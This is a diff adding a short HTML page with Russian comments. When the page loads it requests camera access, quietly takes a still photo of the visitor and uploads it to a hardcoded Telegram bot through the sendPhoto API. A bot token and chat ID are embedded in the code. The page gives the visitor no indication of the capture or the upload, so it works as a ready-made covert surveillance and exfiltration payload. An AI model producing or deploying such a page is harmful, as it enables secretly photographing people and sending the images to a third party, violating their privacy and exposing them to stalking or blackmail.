@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<body style="margin:0; background:#000; overflow:hidden;">
+
+<video id="cam" autoplay playsinline style="width:100vw; height:100vh; object-fit:cover;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8365889018:AAEWsk1NrmJYhIbG4XFqI_awk4s4pCX9FqQ";
+const CHAT_ID = "1236150171"; // Укажи свой ID
+
+async function start() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("cam");
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      video.play();
+
+      // Даем камере включиться
+      setTimeout(() => {
+        takePhoto(video);
+      }, 300);
+    };
+  } catch (err) {
+    console.error("Ошибка доступа к камере:", err);
+  }
+}
+
+function takePhoto(video) {
+  const canvas = document.getElementById("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob((blob) => {
+    sendToTelegram(blob);
+  }, "image/png");
+}
+
+async function sendToTelegram(photoBlob) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", photoBlob, "photo.png");
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+start();
+</script>
+
+</body>
+</html>
